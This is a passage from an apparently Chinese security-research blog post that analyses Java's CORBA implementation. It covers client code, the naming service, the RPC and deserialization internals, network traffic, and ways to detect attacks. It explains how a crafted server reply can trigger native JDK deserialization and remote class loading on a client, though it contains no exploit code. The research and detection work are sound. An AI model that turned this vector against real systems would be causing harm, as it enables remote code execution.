side</code>想要真正的获取到具体实现类，就需要首先访问<code>naming service</code>获取这个“引用”，然后访问服务端，之后通过POA的交互返回具体的实例。梳理清楚这一部分后<code>client side</code>的实现就呼之而出了:</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/20/15810705636540.jpg" alt=""></p><p>首先和服务端一样，需要初始化<code>ORB</code>，通过<code>ORB</code>来获取<code>NameService</code>并将其转换成命名上下文。之后通过别名在命名上下文中获取其对应的<code>Stub</code>，调用<code>Stub</code>中的<code>sayhello()</code>方法，这个时候才会完成<code>client side</code>向<code>servant side</code>发送请求，<code>POA</code>处理请求，并将具体实现的<code>HelloImpl</code>包装返回给<code>client side</code>。</p><p>这里有一个需要注意的，<code>helloImpl = HelloHelper.narrow(ncRef.resolve_str(name))</code>返回的是一个<code>_HelloStub</code>而非真正的<code>HelloImpl</code>。只要理解清楚这一点，会避免很多误解。</p><h3 id="2-1-6-naming-service的具体实现"><a href="#2-1-6-naming-service的具体实现" class="headerlink" title="2.1.6 naming service的具体实现"></a>2.1.6 naming service的具体实现</h3><p>ORBD可以理解为ORB的守护进程，其主要负责建立客户端(<code>client side</code>)与服务端(<code>servant side</code>)的关系，同时负责查找指定的IOR(可互操作对象引用，是一种数据结构，是CORBA标准的一部分)。ORBD是由Java原生支持的一个服务，其在整个CORBA通信中充当着<code>naming service</code>的作用，可以通过一行命令进行启动：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ orbd -ORBInitialPort 端口号 -ORBInitialHost url &amp;(表示是否后台执行)</span><br></pre></td></tr></table></figure><h3 id="2-1-7-执行"><a href="#2-1-7-执行" class="headerlink" title="2.1.7 执行"></a>2.1.7 执行</h3><p>当设置并启动<code>naming service</code>后，还需要在<code>server</code>和<code>client</code>中增添一些代码用来指定ORB在初始化的时候所访问的ORBD的地址，如：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/20/15813018565832.jpg" alt=""></p><p>之后完成编译并首先运行<code>server</code>保证将具体实现类绑定到<code>orbd</code>上，然后再运行<code>client</code>完成远程类加载：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/20/15813021029020.jpg" alt=""></p><p>至此就完成了CORBA demo的编写。</p><h2 id="2-2-CORBA的通信过程及各部件之间的关系"><a href="#2-2-CORBA的通信过程及各部件之间的关系" class="headerlink" title="2.2 CORBA的通信过程及各部件之间的关系"></a>2.2 CORBA的通信过程及各部件之间的关系</h2><p>根据2.1的叙述，我们大致知道了CORBA编写的流程，同时粗略的了解了CORBA的执行流，这一小节就来梳理一下其中的几种模型以及关系。</p><h3 id="2-2-1-CORBA通信过程"><a href="#2-2-1-CORBA通信过程" class="headerlink" title="2.2.1 CORBA通信过程"></a>2.2.1 CORBA通信过程</h3><p>首先来看一下CORBA的整体通信过程：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/20/CORBA1.png" alt="CORBA1"></p><ol><li>启动orbd作为<code>naming service</code>，会创建<code>name service</code>服务。</li><li><code>corba server</code>向<code>orbd</code>发送请求获取<code>name service</code>，协商好通信格式。</li><li><code>orbd</code>返回保存的<code>name service</code>。</li><li><code>corba server</code>拿到<code>name service</code>后将具体的实现类绑定到<code>name service</code>上，这个时候<code>orbd</code>会拿到注册后的信息，这个信息就是IOR。</li><li><code>corba client</code>向<code>orbd</code>发起请求获取<code>name service</code>。</li><li><code>orbd</code>返回保存的<code>name service</code>。</li><li><code>corba client</code>在<code>name service</code>中查找已经注册的信息获取到“引用”的信息(<code>corba server</code>的地址等)，通过<code>orb</code>的连接功能将远程方法调用的请求转发到<code>corba server</code>。</li><li><code>corba server</code>通过<code>orb</code>接收请求，并利用<code>POA</code>拦截请求，将请求中所指定的类封装好，同样通过<code>orb</code>的连接功能返回给<code>corba client</code>。</li></ol><h3 id="2-2-2-orb在通信中的作用"><a href="#2-2-2-orb在通信中的作用" class="headerlink" title="2.2.2 orb在通信中的作用"></a>2.2.2 orb在通信中的作用</h3><p><code>orb</code>在通信中充当的角色可以用一张图来表明：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/20/15813042722905.jpg" alt=""></p><p>可以看到<code>orb</code>就是充当客户端与服务端通信的一个媒介，而因为处于不同端的<code>orb</code>在不同的阶段充当不同的角色，有的时候充当接收请求的服务端，有的时候充当发送请求的客户端，但是其本质一直都是同一个对象（相对于一端来说）。举个例子对于<code>corba client</code>来说在与<code>corba server</code>进行通信的过程中，<code>corba clint</code>的<code>orb</code>在发送请求的时候充当客户端，在接收返回的时候充当服务端，而<code>orb</code>从始至终都是其第一次从<code>orbd</code>获取的一个<code>orb</code>。对于这样具有通用性质的<code>orb</code>，称之为<code>common ORB Architecture</code>也就是通用ORB体系。所以<code>CORBA</code>最简单的解释就是通用<code>orb</code>体系。</p><h3 id="2-2-3-Stub及POA的作用"><a href="#2-2-3-Stub及POA的作用" class="headerlink" title="2.2.3 Stub及POA的作用"></a>2.2.3 Stub及POA的作用</h3><p><code>Stub</code>是<code>client side</code>调用<code>orb</code>的媒介，<code>POA</code>是<code>servant side</code>用于拦截<code>client</code>请求的媒介，而两者在结构上其实都是客户端/服务端调用<code>orb</code>的媒介，可以用下面这个图来说明：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/20/15813176110116.jpg" alt=""></p><p><code>orb</code>充当客户端与服务端通信的媒介，而客户端或服务端想要调用<code>orb</code>来发送/处理请求就需要<code>Stub</code>和<code>skeleton</code>，这两部分的具体实现就是<code>Stub</code>与<code>POA</code>。</p><p><code>Stub</code>与<code>POA</code>分别充当客户端和服务器的代理，具体的流程如下（以2.1的demo为例）：</p><ol><li><code>client</code>发起调用：<code>sayHello()</code></li><li><code>Stub</code>封装<code>client</code>的调用请求并发送给<code>orbd</code></li><li><code>orbd</code>接受请求，根据<code>server</code>端的注册信息，分派给<code>server</code>端处理调用请求</li><li><code>server</code>端的<code>orb</code>接收到请求调用<code>POA</code>完成对请求的处理，执行<code>sayHello()</code>，并将执行结果进行封装，传递给<code>orbd</code></li><li><code>orbd</code>接收到<code>server</code>端的返回后将其传递给<code>Stub</code></li><li><code>Stub</code>收到请求后，解析二进制流，提取<code>server</code>端的处理结果</li><li><code>Stub</code>将经过处理后的最终结果返回给<code>client</code>调用者</li></ol><h1 id="0x03-CORBA流程具体分析"><a href="#0x03-CORBA流程具体分析" class="headerlink" title="0x03 CORBA流程具体分析"></a>0x03 CORBA流程具体分析</h1><p>接下来将深入代码实现层对CORBA流程进行具体的分析，主要是从<code>client</code>端进行分析。</p><p>如2.1.5中所提及的，client端的实现大致分为两部分:</p><ul><li>初始化<code>ORB</code>，通过<code>ORB</code>来获取<code>NameService</code>并将其转换成命名上下文。</li><li>获取并调用<code>Stub</code>中相应的方法，完成rpc流程。</li></ul><p>可以发现client的大部分操作都是与<code>Stub</code>所关联的，所以我们需要首先深入的分析<code>Stub</code>的相关生成过程，才能理解后面的rpc流程。</p><h2 id="3-1-Stub的生成"><a href="#3-1-Stub的生成" class="headerlink" title="3.1 Stub的生成"></a>3.1 Stub的生成</h2><p><code>Stub</code>有很多种生成方式，这里列举三种具有代表性的生成方式：</p><ul><li>首先获取<code>NameServer</code>，后通过<code>resolve_str()</code>方法生成（<code>NameServer</code>生成方式）</li><li>使用<code>ORB.string_to_object</code>生成（<code>ORB</code>生成方式）</li><li>使用<code>javax.naming.InitialContext.lookup()</code>生成（JNDI生成方式）</li></ul><p>而以上三种方法都可以总结成两步：</p><ul><li>从<code>orbd</code>获取<code>NameService</code>，<code>NameService</code>中包含<code>IOR</code>。</li><li>根据<code>IOR</code>的信息完成rpc调用。</li></ul><ol><li><p>通过<code>NameServer</code>生成方式：</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Properties properties = <span class="keyword">new</span> Properties();</span><br><span class="line">properties.put(<span class="string">"org.omg.CORBA.ORBInitialHost"</span>, <span class="string">"127.0.0.1"</span>);</span><br><span class="line">properties.put(<span class="string">"org.omg.CORBA.ORBInitialPort"</span>, <span class="string">"1050"</span>);</span><br><span class="line"></span><br><span class="line">ORB orb = ORB.init(args, properties);</span><br><span class="line"></span><br><span class="line">org.omg.CORBA.Object objRef = orb.resolve_initial_references(<span class="string">"NameService"</span>);</span><br><span class="line">NamingContextExt ncRef = NamingContextExtHelper.narrow(objRef);</span><br><span class="line"></span><br><span class="line">String name = <span class="string">"Hello"</span>;</span><br><span class="line">helloImpl = HelloHelper.narrow(ncRef.resolve_str(name));</span><br></pre></td></tr></table></figure></li><li><p>通过<code>ORB</code>生成方式：</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ORB orb = ORB.init(args, <span class="keyword">null</span>);</span><br><span class="line">org.omg.CORBA.Object obj = orb.string_to_object(<span class="string">"corbaname::127.0.0.1:1050#Hello"</span>);</span><br><span class="line">Hello hello = HelloHelper.narrow(obj);</span><br></pre></td></tr></table></figure></li></ol><pre><code>或<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ORB orb = ORB.init(args, <span class="keyword">null</span>);</span><br><span class="line">org.omg.CORBA.Object obj = orb.string_to_object(<span class="string">"corbaloc::127.0.0.1:1050"</span>);</span><br><span class="line">NamingContextExt ncRef = NamingContextExtHelper.narrow(obj);</span><br><span class="line">Hello hello = HelloHelper.narrow(ncRef.resolve_str(<span class="string">"Hello"</span>));</span><br></pre></td></tr></table></figure></code></pre><ol><li><p>通过JNDI生成方式：</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ORB orb = ORB.init(args, <span class="keyword">null</span>);</span><br><span class="line">Hashtable env = <span class="keyword">new</span> Hashtable(<span class="number">5</span>, <span class="number">0.75f</span>);</span><br><span class="line">env.put(<span class="string">"java.naming.corba.orb"</span>, orb);</span><br><span class="line">Context ic = <span class="keyword">new</span> InitialContext(env);</span><br><span class="line">Hello helloRef = HelloHelper.narrow((org.omg.CORBA.Object)ic.lookup(<span class="string">"corbaname::127.0.0.1:1050#Hello"</span>));</span><br></pre></td></tr></table></figure></li></ol><p>通过<code>NameServer</code>生成方式我们已经很熟悉了，接下来我们来着重看一下通过ORB的生成方式，其实和<code>Stub</code>反序列化处的处理是一样的：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/20/15813263516463.jpg" alt=""></p><p>关键点就是在<code>string_to_object()</code>方法上，跟进看一下，具体实现在<code>com.sun.corba.se.impl.orb.ORBImpl</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/20/15813266732245.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/20/15813267328916.jpg" alt=""></p><p>在<code>operate</code>中会对出入的字符串进行协议匹配，这里支持三种协议：</p><ul><li><code>IOR</code></li><li><code>Corbaname</code></li><li><code>Corbaloc</code>与<code>IOR</code>最终都会生成一个<code>Stub</code></li></ul><p>在这里<code>IOR</code>是在获取到<code>IOR</code>后生成<code>Stub</code>完成rpc调用的，而真正无需事先声明获取<code>NameService</code>过程，<strong>直接可以完成rpc调用的就只有<code>Corbaname</code>协议和<code>Corbaloc</code>协议了</strong>。<code>Corbaname</code>与<code>Corbaloc</code>在实现上有相近点，具体体现在对url_str的解析以及处理流上。这里我们首先看一下<code>insURLHandler.parseURL()</code>对于url_str的解析流程：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/20/15814108518752.jpg" alt=""></p><p>可以看到<code>CorbanameURL</code>的生成过程就是将<code>corbaname:</code>到<code>#</code>这段内容提取出来重新填充到<code>corbaloc:</code>后，也就是说最终与<code>orbd</code>通信所利用的协议仍然是<code>Corbaloc</code>，之后将<code>#</code>后的内容作为<code>rootnaming context</code>的引用名。</p><p>接下里我们看一下处理流当中的相似点：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/20/15814115945095.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/20/15814116238446.jpg" alt=""></p><p>可以看到都是通过<code>getIORUsingCorbaloc()</code>方法来从<code>orbd</code>获取IOR的。而在<code>resolveCorbaname</code>中又在后续增加了和<code>NamingService</code>相同的操作。所以通过这两部分能看出具体通信使用的是<code>Corbaloc</code>。</p><h2 id="3-2-rpc流程"><a href="#3-2-rpc流程" class="headerlink" title="3.2 rpc流程"></a>3.2 rpc流程</h2><p>通过上面的分析，我们大致知道了生成<code>Stub</code>的几种方式，其中有非常重要的一个方法<code>resolve_str()</code>完成了具体的rpc流程，接下来将详细的分析一下流程。</p><p><code>resolve_str()</code>在客户端的具体实现逻辑在<code>org.omg.CosNaming._NamingContextExtStub</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/20/15814766476491.jpg" alt=""></p><p>在红框所示的这两行代码中完成了rpc调用及反序列化流程，其主要完成了根据IOR完成通信初始化、发送请求、接受请求、反序列化等流程，接下来将一个一个详细的说明。</p><h3 id="3-2-1-通信初始化"><a href="#3-2-1-通信初始化" class="headerlink" title="3.2.1 通信初始化"></a>3.2.1 通信初始化</h3><p>这一部分的功能实现在<code>_request()</code>方法中体现。通信初始化可以简单的表现在两个方面：</p><ul><li><code>CorbaMessageMediator</code>初始化</li><li><code>OutputObject</code>初始化</li></ul><p>具体跟进一下代码<code>_request()</code>的具体实现在<code>com.sun.corba.se.impl.protocol.CorbaDelegateImpl#request</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/20/15814771355790.jpg" alt=""></p><p>这里可以看到首先设置了客户端调用信息，之后获取到<code>ClientRequestDispatcher</code>也就是客户端请求分派器并调用了<code>beginRequest()</code>方法，由于<code>beginRequest()</code>方法过于长，我将比较重要的代码直接截下来分析：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/20/15815629233453.jpg" alt=""></p><p>首先初始化拦截器，这里的拦截器主要负责拦截返回信息。</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/20/15815604300289.jpg" alt=""></p><p>之后根据连接状态来确定是否需要新建<code>CorbaConnection</code>，由于是第一次进行通信，没有之前的链接缓存，所以需要创建<code>CorbaConnection</code>。在创建新链接后，就创建了<code>CorbaMessageMediator</code>，这是完成后续数据处理过程中重要的一环。</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/20/15815623112878.jpg" alt=""></p><p>紧接着通过<code>CorbaMessageMediator</code>来创建<code>OutputObject</code>，这里其实创建的是一个<code>CDROutputObject</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/20/15815624211627.jpg" alt=""></p><p>所以底层的数据是由<code>CDROutputObject</code>及<code>CDRInputObject</code>来处理的。这一点会在后面的反序列化中有所提及。</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/20/15815627861361.jpg" alt=""></p><p>完成上述初始化过程后需要首先开启拦截器，以防止初始片段在消息初始化期间发送。</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/20/15815630995242.jpg" alt=""></p><p>最后完成消息的初始化：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/20/15815631489160.jpg" alt=""></p><p>将序列化字符写入请求头中，完成消息的初始化，这里所调用的序列化是是<code>OutputStream</code>的原生序列化过程。</p><h3 id="3-2-2-发送并接收请求"><a href="#3-2-2-发送并接收请求" class="headerlink" title="3.2.2 发送并接收请求"></a>3.2.2 发送并接收请求</h3><p>发送并接收请求主要是在<code>_invoke()</code>方法中完成的：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/20/15815645741576.jpg" alt=""></p><p>首先获取到客户端请求分派器，之后调用<code>marshlingComplete()</code>方法完成具体的处理流程：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/20/15815646791192.jpg" alt=""></p><p>这里涉及到两个关键的处理流程<code>marshalingComplete1()</code>及<code>processResponse()</code>。</p><h4 id="marshalingComplete1流程"><a href="#marshalingComplete1流程" class="headerlink" title="marshalingComplete1流程"></a>marshalingComplete1流程</h4><p>首先先看一下<code>marshalingComplete1()</code>流程：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/20/15815647902622.jpg" alt=""></p><p><code>finishSendingRequest()</code>中完成了请求的发送：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/20/15815844064612.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/20/15815844406300.jpg" alt=""></p><p>可以看到获取了连接信息，将<code>OutputObject</code>进行发送。</p><p><code>waitForResponse()</code>完成了等待返回接收返回的功能：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/20/15816479962262.jpg" alt=""></p><p>通过标志位来判断是否已经接收到了请求，如果接收到请求则把序列化内容进行返回：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/20/15816480625369.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/20/15816480958041.jpg" alt=""></p><h4 id="processResponse流程"><a href="#processResponse流程" class="headerlink" title="processResponse流程"></a>processResponse流程</h4><p><code>processResponse</code>的具体实行流程很长，但是关键的运行逻辑只是如下的代码：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/20/15816501205101.jpg" alt=""></p><p>这里的<code>handleDIIReply</code>是需要着重说明一下，其中<code>DII</code>的全名是<code>Dynamic Invocation Interface</code>也就是动态调用接口，这是CORBA调用的一种方式，既可以用<code>Stub</code>方式调用，也可以通过<code>DII</code>方式调用。目前我们所需要知道的是<code>handleDIIReply</code>就是用于处理CORBA调用返回的方法就好：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/20/15816504171478.jpg" alt=""></p><p>这里会判断调用的请求是否是<code>DII</code>请求，如果是，则会对返回结果及参数进行处理，触发反序列化流程，<strong>这一点属于<code>client</code>端的反序列化利用手法，后面会有文章进行总结，</strong>目前只是将这一个关键单抛出来详细的说一下流程。</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/20/15816507818674.jpg" alt=""></p><p>这里的<code>switch case</code>就是判断我们前面所提过的IDL的三种参数传递方式，当参数传递方式为<code>out</code>和<code>inout</code>时将会调用<code>Any.read_value</code>方法：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/20/15816509741694.jpg" alt=""></p><p>在<code>TCUtility.unmarshalIn()</code>中有一个很长的<code>switch case</code>，会根据类型来将调用分发到不同的处理方法中，其中有两个链路：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/20/15816512811900.jpg" alt=""></p><p>以<code>read_value()</code>来举例：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/20/15816516983602.jpg" alt=""></p><p>可以看到<code>read_value()</code>在选择具体实现的时候是有分支选项的，这其实都可以通过构造来进行指定，这里我们只看<code>IDLJavaSerializationInputStream</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/20/15816518936791.jpg" alt=""></p><p>会直接触发JDK原生反序列化。</p><p>也就是只要在<code>server</code>端精心构造打包结果，当<code>client</code>端发起<code>DII</code>的rpc请求处理请求返回时会触发JDK原生的反序列化流程。</p><h3 id="3-2-3-反序列化流程"><a href="#3-2-3-反序列化流程" class="headerlink" title="3.2.3 反序列化流程"></a>3.2.3 反序列化流程</h3><p>反序列化触发在<code>org.omg.CORBA.ObjectHelper#read()</code>方法中，最终是调用<code>CDRInputStream_1_0#read_Object</code>来处理，这里我只截关键点：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/20/15816525114776.jpg" alt=""></p><p><code>createStubFactory()</code>会指定class的加载地址为提取出来的<code>codebase</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/20/15816644739320.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/20/15816642445951.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/20/15816642834484.jpg" alt=""></p><p>可以看到具体的远程调用逻辑还是使用的RMI完成的。当完成远程类加载后便初始化<code>StubFactoryStaticImpl</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/20/15816644953954.jpg" alt=""></p><p>这里会设定<code>stubClass</code>，后面会使用使用<code>makeStub()</code>方法完成实例化。</p><p>在完成了远程类加载后，就需要将远程的类变为常规的本地类，这一部分的工作是由<code>internalIORToObject()</code>方法完成的：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/20/15816648993509.jpg" alt=""></p><p>红框所示的两处最终的逻辑都一样，都是<code>stubFactory.makeStub()</code>:</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/20/15816649783661.jpg" alt=""></p><p>我们在<code>createStubFactory()</code>中已经将完成远程类加载的类置为<code>stub</code>，在<code>makeStub()</code>方法中则完成将其进行实例化的操作，至此便完成了全部的rpc流程。</p><h2 id="3-3-小结"><a href="#3-3-小结" class="headerlink" title="3.3 小结"></a>3.3 小结</h2><p>通过上文对代码的跟踪，不难看出三端都是通过序列化数据来进行沟通的，都是<code>CDROutputObject</code>与<code>CDRInputObject</code>的具体实现。所以说<code>CDROutputObject</code>与<code>CDRInputObject</code>是CORBA数据的底层处理类，当在实际序列化/反序列化数据时，具体的处理流程大致可分为两类：</p><ul><li><code>CDROutputStream_x_x</code>/<code>CDRInputStream_x_x</code></li><li><code>IDLJavaSerializationOutputStream</code>/<code>IDLJavaSerializationInputStream</code></li></ul><p>这里可以将这两类简述为：</p><ul><li>CDR打/解包流程</li><li>JDK serial 序列化/反序列化流程</li></ul><p>可以看到只有在JDK serial流程中，才会触发CORBA的反序列化流程。CDR更多是用于完成rpc流程。</p><p>无论是在接收或者发送的流程中，我们都可以看到本质上都是底层数据（<code>CDROutputObject</code>或<code>CDRInputObject</code>）-&gt;<code>CorbaMessageMediator</code>的处理过程，具体的发送与接收请求都是通过<code>CorbaMessageMediator</code>来管控与拦截的，所以想要具体分析CORBA通信过程中请求的发送与接收方式，只需要以<code>CorbaMessageMediator</code>为入手点即可。</p><p>无论<code>client side</code>还是<code>servant</code>在接收请求时基本上都是通过<code>com.sun.corba.se.impl.transport.SocketOrChannelConnectionImpl#read</code>或<code>com.sun.corba.se.impl.transport.SocketOrChannelConnectionImpl#doWork</code>处理请求到<code>com.sun.corba.se.impl.transport.SocketOrChannelConnectionImpl#dispatch</code>，后续会因为message类型的不同而进入到不同的处理逻辑中。在选取处理逻辑时主要凭借2点：</p><ul><li>header信息决定的版本</li><li>message信息决定的具体类型</li></ul><h1 id="0x04-CORBA网络通信分析"><a href="#0x04-CORBA网络通信分析" class="headerlink" title="0x04 CORBA网络通信分析"></a>0x04 CORBA网络通信分析</h1><p>纵观整个CORBA的通信流程，不难看出大致分为3个部分：</p><ul><li>与<code>orbd</code>通信获取<code>NamingService</code></li><li><code>servant side</code>注册</li><li>rpc通信</li></ul><p>在具体的流量中也可以清楚的看到整个过程。（由于我是在本地做的测试，所以在流量中的源地址和目的地址都是127.0.0.1）</p><p>这里的2条流量展现了与<code>orbd</code>通信获取<code>NamingService</code>的流程：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/20/15819940273656.jpg" alt="-w1172"></p><p>这里着重看一下返回包:</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/20/15819943041478.jpg" alt="-w750"></p><p>可以看到返回了<code>RootPOA</code>，且将<code>NameService</code>指向<code>orbd</code>处的NC0文件。</p><p>在获取到<code>NamingService</code>后，在<code>servant side</code>注册前，有如下两端流量：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/20/15819948691818.jpg" alt="-w1175"></p><p>这段流量对应的代码是：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/20/15819949045353.jpg" alt=""></p><p>主要的作用是用于检查获取到的<code>NamingService</code>是否是<code>NamingContextExt</code>的实现。</p><p>实现注册的流量如下:</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/20/15819953685072.jpg" alt="-w1175"></p><p><code>op=to_name</code>对应的代码是：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/20/15819954117639.jpg" alt=""></p><p>可以简单的理解为设定引用名。</p><p><code>op=rebind</code>对应的代码是：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/20/15819954591161.jpg" alt=""></p><p>这一部分就是通过GIOP传输的CORBA接口的一部分，Wireshark可以将其解码，并将其协议类型标注为<code>COSNAMING</code>，具体来看一下请求包：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/20/15819956469520.jpg" alt="-w566"></p><p>这里在IOR中我们注意到指定了：</p><ul><li><code>type_id</code>：用于指定本次（资料库或者说是引用）注册的id（实际上是接口类型，就是用于表示接口的唯一标识符），用于实现类型安全。</li><li><code>Profile_host</code>、<code>Profile_port</code>：<code>servant side</code>地址。</li><li><code>Profile ID</code>：指定了<code>profile_data</code>中的内容，例如这里的<code>TAG_INTERNET_IOP</code>所指定的就是<code>IIOP Profile</code>。</li></ul><p>通过IOR信息表示了<code>servant side</code>的相关rpc信息。</p><p>在rpc流程中的关键流量就是rpc调用，这里不再赘述获取<code>NamingService</code>的流量，直接看远程调用流量：</p><p><img src="http://image-lucifaer.test.upcdn.net/2020/02/20/15819969438106.jpg" alt=""></p><p>这里涉及到3.2中所说到的发送和接受请求的流程，想要了解详情可以回看这一部分的内容。简单来说可以把这一部分理解成如下流程：</p><ul><li>根据引用名获取<code>servant side</code>的接口<code>Stub</code>。</li><li>利用<code>Stub</code>中的代理方法二次发起请求，通过发送方法名在<code>servant side</code>调用具体的方法，<code>servant side</code>将方法的结果返回给<code>client side</code>完成rpc调用。</li></ul><h1 id="0x05-检测方式"><a href="#0x05-检测方式" class="headerlink" title="0x05 检测方式"></a>0x05 检测方式</h1><p>由于CORBA的数据传递与传统的序列化传输方式不同，即在二进制流中没有<code>ac ed 00 05</code>的标识，所以单纯从流量的角度是很难识别的，只能从流量上下文中进行识别。</p><p>通常可以从这两个角度来进行判断：</p><ul><li>请求ip是否为白名单中的ip</li><li>是否存在外部ip向<code>orbd</code>发送<code>COSNAMING</code>请求</li></ul><p>以weblogic为例，正常的CORBA交互模型应为白名单（业务）ip向weblogic（codebase或中间件）发送rpc请求，完成远程类加载，同时白名单ip处应该有缓存机制以防止频繁向weblogic发送GIOP请求。而恶意攻击者在尝试进行攻击时可能产生如下的反常动作：</p><ul><li>非白名单ip向weblogic发送GIOP请求</li><li>非白名单ip向weblogic发送<code>COSNAMING</code>请求</li><li>白名单ip但是非开发机ip向weblogic发送<code>COSNAMING</code>请求</li></ul><p>第一点就不赘述了，第二点和第三点解释一下。通过0x04中对流量的分析，我们知道当一个<code>servant side</code>尝试向<code>orbd</code>注册新的引用时会产生<code>COSNAMING</code>类型的流量，那么<code>COSNAMING</code>类型的流量就可以作为一个判别注册的标志，如果是非权限区域（非开发机或者内部云平台）的机器尝试进行注册一个新的引用的话，就有可能标明存在攻击尝试。</p><p>当然这并不是一种非常准确且高效的检测方式，但是由于CORBA的特殊性，除非上RASP或者在终端agent上加行为检测规则，想要单纯的通过镜像流量做到监测，是非常难的。</p><h1 id="0x06-Reference"><a href="#0x06-Reference" class="headerlink" title="0x06 Reference"></a>0x06 Reference</h1><ul><li><a href="http://weinan.io/2017/05/03/corba-iiop.html" target="_blank" rel="noopener">http://weinan.io/2017/05/03/corba-iiop.html</a></li><li><a href="https://docs.oracle.com/javase/7/docs/technotes/guides/rmi-iiop/tutorial.html#7738" target="_blank" rel="noopener">https://docs.oracle.com/javase/7/docs/technotes/guides/rmi-iiop/tutorial.html#7738</a></li><li><a href="https://docs.oracle.com/javase/8/docs/technotes/guides/idl/GShome.html" target="_blank" rel="noopener">https://docs.oracle.com/javase/8/docs/technotes/guides/idl/GShome.html</a></li><li><a href="https://www.omg.org/corba/faq.htm" target="_blank" rel="noopener">https://www.omg.org/corba/faq.htm</a></li><li><a href="https://en.wikipedia.org/wiki/Common_Object_Request_Broker_Architecture" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Common_Object_Request_Broker_Architecture</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在说到JNDI的时候，我们最常接触到的都是较为上层的JNDI SPI（服务端提供的接口），除了常用的RMI、LDAP这些服务，还存在CORBA服务，这篇文章的重点就是来学习一下JNDI如何使用CORBA服务，并以尽量详尽的用例子来解释清楚如何使用CORBA的各个流程。&lt;/p
      
    
    </summary>
    
      <category term="安全研究" scheme="https://lucifaer.com/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="Java" scheme="https://lucifaer.com/tags/Java/"/>
    
      <category term="安全研究" scheme="https://lucifaer.com/tags/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/"/>
    
  </entry>
  
  <entry>
    <title>浅谈RASP</title>
    <link href="https://lucifaer.com/2019/09/25/%E6%B5%85%E8%B0%88RASP/"/>
    <id>https://lucifaer.com/2019/09/25/浅谈RASP/</id>
    <published>2019-09-25T08:32:00.000Z</published>
    <updated>2019-09-25T08:32:58.223Z</updated>
    
